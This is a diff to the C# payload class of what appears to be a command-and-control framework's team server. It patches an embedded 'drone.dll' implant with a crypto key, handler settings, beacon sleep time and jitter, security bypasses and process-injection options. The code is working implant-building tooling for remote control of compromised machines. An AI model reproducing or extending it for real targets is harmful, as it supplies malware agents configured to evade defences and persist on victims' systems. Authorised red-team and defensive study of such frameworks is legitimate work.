@@ -12,13 +12,17 @@ namespace TeamServer.Models
     public abstract class Payload
     {
         protected C2Profile C2Profile { get; }
-        public Handler Handler { get; }
+        protected Handler Handler { get; }
+        protected string CryptoKey { get; }
+        
         public byte[] Bytes { get; protected set; }
 
-        protected Payload(Handler handler, C2Profile c2Profile)
+        protected Payload(Handler handler, C2Profile c2Profile, string cryptoKey)
         {
             Handler = handler;
             C2Profile = c2Profile;
+
+            CryptoKey = cryptoKey;
         }
 
         public abstract Task Generate();
@@ -27,13 +31,21 @@ namespace TeamServer.Models
         {
             var drone = await Utilities.GetEmbeddedResource("drone.dll");
             var module = ModuleDefMD.Load(drone);
-            
+
+            EmbedCryptoKey(module);
             EmbedHandler(module);
-            SetAppDomainName(module);
+            SetSleepTime(module);
             SetBypasses(module);
             SetProcessInjectionOptions(module);
 
             return module;
+        }
+
+        private void EmbedCryptoKey(ModuleDef module)
+        {
+            var type = module.Types.GetType("Crypto");
+            var method = type.Methods.GetMethod("Key");
+            method.Body.Instructions[0].Operand = CryptoKey;
         }
 
         private void EmbedHandler(ModuleDef module)
@@ -71,6 +83,8 @@ namespace TeamServer.Models
             {
                 foreach (var handlerParameter in Handler.Parameters)
                 {
+                    if (string.IsNullOrWhiteSpace(handlerParameter.Value)) continue;
+                    
                     // get matching method in handler
                     var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
                     var instruction = method?.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
@@ -85,11 +99,15 @@ namespace TeamServer.Models
             getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();
         }
 
-        private void SetAppDomainName(ModuleDef module)
+        private void SetSleepTime(ModuleDef module)
         {
-            var type = module.Types.GetType("Assembly");
-            var method = type.Methods.GetMethod("AppDomainName");
-            method.Body.Instructions[0].Operand = C2Profile.PostExploitation.AppDomain;
+            var type = module.Types.GetType("Utilities");
+            
+            var sleepInterval = type.Methods.GetMethod("GetSleepInterval");
+            sleepInterval.Body.Instructions[0].Operand = C2Profile.Stage.SleepTime;
+            
+            var sleepJitter = type.Methods.GetMethod("GetSleepJitter");
+            sleepJitter.Body.Instructions[0].Operand = C2Profile.Stage.SleepJitter;
         }
 
         private void SetBypasses(ModuleDef module)
